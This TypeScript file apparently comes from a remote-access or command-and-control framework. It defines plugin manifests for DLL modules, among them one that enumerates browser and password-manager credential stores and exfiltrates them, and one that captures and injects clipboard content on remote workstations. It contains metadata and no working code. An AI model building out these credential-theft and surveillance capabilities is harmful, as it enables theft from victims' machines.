import type { PluginManifest } from '../../../../shared/types/plugin-manifest.js';

export const pluginManifests: PluginManifest[] = [
	{
		id: 'clipboard-sync',
		name: 'Clipboard Sync',
		version: '1.4.2',
		description: 'Synchronize clipboard activity across operator sessions with encryption at rest.',
		entry: 'clipboard-sync.dll',
		author: 'Tenvy Labs',
		categories: ['collection'],
		capabilities: [
			{
				name: 'clipboard.capture',
				module: 'clipboard',
				description: 'Capture remote clipboard history and relay updates in real time.'
			},
			{
				name: 'clipboard.push',
				module: 'clipboard',
				description: 'Inject clipboard payloads into the remote workstation.'
			}
		],
		requirements: {
			minAgentVersion: '1.2.0',
			platforms: ['windows', 'darwin'],
			requiredModules: ['clipboard']
		},
		distribution: {
			defaultMode: 'automatic',
			autoUpdate: true,
			signature: {
				type: 'sha256',
				hash: 'd8b8a0fb9c8f8e3a72d88e3f7a8c6d1f1fbb83c9f6c2ddacb12e3b45f1a8bbef'
			}
		},
		package: {
			artifact: 'clipboard-sync-1.4.2.dll',
			sizeBytes: 18743296
		}
	},
	{
		id: 'remote-vault',
		name: 'Remote Vault',
		version: '0.9.5',
		description: 'Collect credential material from browsers and secure storage providers.',
		entry: 'remote-vault.dll',
		author: 'Nimbus Team',
		categories: ['collection', 'operations'],
		capabilities: [
			{
				name: 'vault.enumerate',
				module: 'system-info',
				description: 'Enumerate installed password managers and browser credential stores.'
			},
			{
				name: 'vault.export',
				module: 'recovery',
				description: 'Stage and exfiltrate vault exports via the recovery pipeline.'
			}
		],
		requirements: {
			minAgentVersion: '1.3.0',
			requiredModules: ['system-info', 'recovery']
		},
		distribution: {
			defaultMode: 'manual',
			autoUpdate: false,
			signature: {
				type: 'ed25519',
				hash: '9e4cba26f4f913a52fcb11f16a34f1db493f9204f0545d01b7a086764d814176',
				publicKey: 'edpk1tVL7Ah5pPqgZRtM7Ypc9S8vUuB1yhXqn7t5u8XH2'
			}
		},
		package: {
			artifact: 'remote-vault-0.9.5.dll',
			sizeBytes: 24641536
		}
	},
	{
		id: 'stream-relay',
		name: 'Stream Relay',
		version: '2.1.0',
		description: 'Optimized relay for high fidelity remote desktop streaming and archival.',
		entry: 'stream-relay.dll',
		author: 'Tenvy Labs',
		categories: ['transport'],
		capabilities: [
			{
				name: 'remote-desktop.metrics',
				module: 'remote-desktop',
				description: 'Collect frame quality and adaptive bitrate metrics for dashboards.'
			}
		],
		requirements: {
			minAgentVersion: '1.1.0',
			requiredModules: ['remote-desktop']
		},
		distribution: {
			defaultMode: 'automatic',
			autoUpdate: true,
			signature: {
				type: 'sha256',
				hash: '4fa1e33f99de3c58a4f0b6cbb9df450c3a7fd41b944fdc0bb70a0e0c3a4c299a'
			}
		},
		package: {
			artifact: 'stream-relay-2.1.0.dll',
			sizeBytes: 15073280
		}
	},
	{
		id: 'incident-notes',
		name: 'Incident Notes Sync',
		version: '1.0.1',
		description: 'Synchronize analyst notes to the secure operations vault with delta compression.',
		entry: 'incident-notes.dll',
		author: 'Ops Collective',
		categories: ['persistence'],
		capabilities: [
			{
				name: 'notes.sync',
				module: 'notes',
				description: 'Push local notes to the operator vault after each sync cycle.'
			}
		],
		requirements: {
			minAgentVersion: '1.0.0',
			requiredModules: ['notes']
		},
		distribution: {
			defaultMode: 'automatic',
			autoUpdate: true,
			signature: {
				type: 'none'
			}
		},
		package: {
			artifact: 'incident-notes-1.0.1.dll',
			sizeBytes: 7340032
		}
	}
];
